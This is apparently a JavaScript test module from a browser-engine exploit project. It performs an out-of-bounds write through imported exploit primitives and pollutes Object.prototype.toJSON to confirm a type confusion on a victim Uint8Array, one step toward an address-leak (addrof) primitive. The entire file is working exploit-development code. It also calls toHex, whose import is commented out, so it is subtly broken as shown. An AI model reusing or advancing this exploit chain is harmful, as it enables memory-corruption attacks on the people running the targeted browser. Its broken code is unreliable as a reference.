// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v28_VerifyProbeCapture)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
// import { AdvancedInt64, toHex } from '../utils.mjs'; // Não usado neste teste
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V28_VPC = "OriginalHeisenbug_TypedArrayAddrof_v28_VerifyProbeCapture";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let last_probe_details_v28 = null; 
let victim_typed_array_ref_v28 = null; 
let probe_call_count_v28 = 0;
const PROBE_CALL_LIMIT_V28 = 5; 

function toJSON_TA_Probe_VerifyCapture() {
    probe_call_count_v28++;
    const call_num = probe_call_count_v28;
    // Este objeto é local para cada chamada da sonda
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v28_VerifyProbeCapture",
        this_type: "N/A",
        error_in_probe: null,
        this_is_victim: false
    };

    try {
        current_call_details.this_type = Object.prototype.toString.call(this);
        current_call_details.this_is_victim = (this === victim_typed_array_ref_v28);
        
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}.`, "leak");

        if (call_num > PROBE_CALL_LIMIT_V28) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit. Returning stop marker.`, "warn");
            // Atualiza o global com os detalhes desta chamada de "parada"
            last_probe_details_v28 = current_call_details; 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num} (limit hit) FINISHING. Global 'last_probe_details_v28' set to: ${JSON.stringify(last_probe_details_v28)}`, "dev_verbose");
            return { recursion_stopped_v28: true, call: call_num };
        }

        if (current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'!`, "vuln");
        }
    } catch (e) {
        current_call_details.error_in_probe = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name}`, "error");
    }
    
    // ATRIBUI A REFERÊNCIA do objeto local ao global.
    last_probe_details_v28 = current_call_details; 
    logS3(`[${current_call_details.probe_variant}] Call #${call_num} FINISHING. Global 'last_probe_details_v28' set to: ${JSON.stringify(last_probe_details_v28)}`, "dev_verbose");

    return { "probe_marker_v28": call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_VerifyProbeCapture() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V28_VPC}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Verifying Probe Capture ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V28_VPC} Init...`;

    probe_call_count_v28 = 0;
    last_probe_details_v28 = null; 
    victim_typed_array_ref_v28 = null; 

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_details_of_last_probe_run = null; 
    let heisenbugConfirmedByLog = false;
    
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v28 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        logS3(`STEP 2: victim_typed_array_ref_v28 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_VerifyCapture, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v28); 
            logS3(`  JSON.stringify completed. Stringify Output: ${JSON.stringify(stringifyOutput)}`, "info", FNAME_CURRENT_TEST);
            
            // Logar o estado da variável global IMEDIATAMENTE APÓS stringify
            logS3(`  EXECUTE: State of GLOBAL 'last_probe_details_v28' AFTER stringify: ${last_probe_details_v28 ? JSON.stringify(last_probe_details_v28) : 'null'}`, "dev_critical");
            
            if (last_probe_details_v28) {
                // Fazer cópia profunda para análise estável
                captured_details_of_last_probe_run = JSON.parse(JSON.stringify(last_probe_details_v28)); 
            }
            logS3(`  EXECUTE: Captured details (deep copy of global var): ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (captured_details_of_last_probe_run && 
                captured_details_of_last_probe_run.this_type === "[object Object]") {
                heisenbugConfirmedByLog = true;
                logS3(`  EXECUTE: HEISENBUG CONFIRMED by captured details! 'this' type in last recorded probe: ${captured_details_of_last_probe_run.this_type}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug NOT confirmed by captured details. Last recorded 'this' type: ${captured_details_of_last_probe_run ? captured_details_of_last_probe_run.this_type : 'N/A (or probe not called)'}`, "error", FNAME_CURRENT_TEST);
            }
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V28_VPC}: ${heisenbugConfirmedByLog ? "TC Log OK" : "TC Log FAIL"}`;

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V28_VPC}: Stringify/Verify ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V28_VPC} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v28}`, "info", FNAME_CURRENT_TEST);
        logS3(`Heisenbug confirmation by final log check: ${heisenbugConfirmedByLog}`, heisenbugConfirmedByLog ? "good" : "warn", FNAME_CURRENT_TEST);
        if (captured_details_of_last_probe_run) {
             logS3(`Final captured probe details object: ${JSON.stringify(captured_details_of_last_probe_run)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        victim_typed_array_ref_v28 = null; 
        last_probe_details_v28 = null; 
        probe_call_count_v28 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_details_of_last_probe_run, 
        total_probe_calls: probe_call_count_v28,
        heisenbug_confirmed_by_log: heisenbugConfirmedByLog
    };
}
